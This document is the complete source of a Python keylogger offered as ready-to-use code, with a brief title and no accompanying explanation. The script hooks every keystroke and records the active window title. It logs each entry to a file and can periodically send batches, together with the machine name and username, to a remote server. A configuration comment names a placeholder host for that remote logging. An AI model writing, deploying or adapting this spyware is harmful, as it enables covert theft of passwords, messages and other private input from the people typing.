# keylogger-
code in python
#!/usr/bin/env python3
# Keylogger.py - Complete Python Keylogger

import keyboard
import requests
import json
import threading
import time
from datetime import datetime
import os
import sys

print("=" * 50)
print("PYTHON KEYLOGGER")
print("=" * 50)

class Keylogger:
    def __init__(self):
        self.log_file = "keylog.txt"
        self.server_url = None  # Change to your server URL if needed
        self.buffer = []
        self.is_running = True
        
    def on_key_event(self, event):
        if not self.is_running:
            return
        
        # Get current time
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Get window title (Windows only)
        window_title = "Unknown"
        try:
            if sys.platform == "win32":
                import win32gui
                window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if not window_title:
                    window_title = "No Title"
        except:
            window_title = "Error getting title"
        
        # Prepare log entry
        log_entry = {
            "time": current_time,
            "key": event.name,
            "event": event.event_type,
            "window": window_title[:100]  # Limit length
        }
        
        # Print to console
        print(f"[{current_time}] {event.name:10} | Window: {window_title[:30]}")
        
        # Save to file
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry) + "\n")
        
        # Add to buffer for remote sending
        self.buffer.append(log_entry)
        
        # Auto-send if buffer gets large
        if len(self.buffer) > 50:
            self.send_to_server()
    
    def send_to_server(self):
        """Send data to remote server"""
        if not self.server_url or not self.buffer:
            return
        
        try:
            data_to_send = self.buffer.copy()
            self.buffer = []  # Clear buffer
            
            payload = {
                "keystrokes": data_to_send,
                "computer": os.environ.get("COMPUTERNAME", "Unknown"),
                "user": os.environ.get("USERNAME", "Unknown")
            }
            
            response = requests.post(
                self.server_url,
                json=payload,
                timeout=3
            )
            
            if response.status_code == 200:
                print(f"[+] Sent {len(data_to_send)} keystrokes to server")
            else:
                # If failed, put data back
                self.buffer = data_to_send + self.buffer
                
        except Exception as e:
            # On error, restore data
            self.buffer = data_to_send + self.buffer
            print(f"[-] Server error: {e}")
    
    def start(self):
        print("\n[*] Starting keylogger...")
        print(f"[*] Log file: {self.log_file}")
        print(f"[*] Server: {self.server_url if self.server_url else 'Local only'}")
        print("[*] Press Ctrl+C to stop\n")
        
        # Hook keyboard
        keyboard.hook(self.on_key_event)
        
        # Start auto-send thread if server is set
        if self.server_url:
            def auto_send():
                while self.is_running:
                    time.sleep(30)  # Send every 30 seconds
                    self.send_to_server()
            
            thread = threading.Thread(target=auto_send, daemon=True)
            thread.start()
        
        # Wait for exit
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            print("\n[*] Stopping...")
        finally:
            self.stop()
    
    def stop(self):
        self.is_running = False
        keyboard.unhook_all()
        
        # Send any remaining data
        if self.buffer:
            self.send_to_server()
        
        print(f"\n[+] Keylogger stopped")
        print(f"[+] Logs saved to: {self.log_file}")
        print(f"[+] Total entries: {sum(1 for line in open(self.log_file))}")

# Main execution
if __name__ == "__main__":
    # CONFIGURATION - EDIT THESE
    CONFIG = {
        "server_url": None,  # Set to "http://your-server.com:8080" for remote logging
        "log_file": "keylog.json"
    }
    
    # Check if running as admin (recommended)
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            print("[!] Warning: Not running as Administrator")
            print("[!] Some keys may not be captured")
            input("Press Enter to continue anyway...")
    except:
        pass
    
    # Create and run keylogger
    logger = Keylogger()
    logger.log_file = CONFIG["log_file"]
    logger.server_url = CONFIG["server_url"]
    
    logger.start()
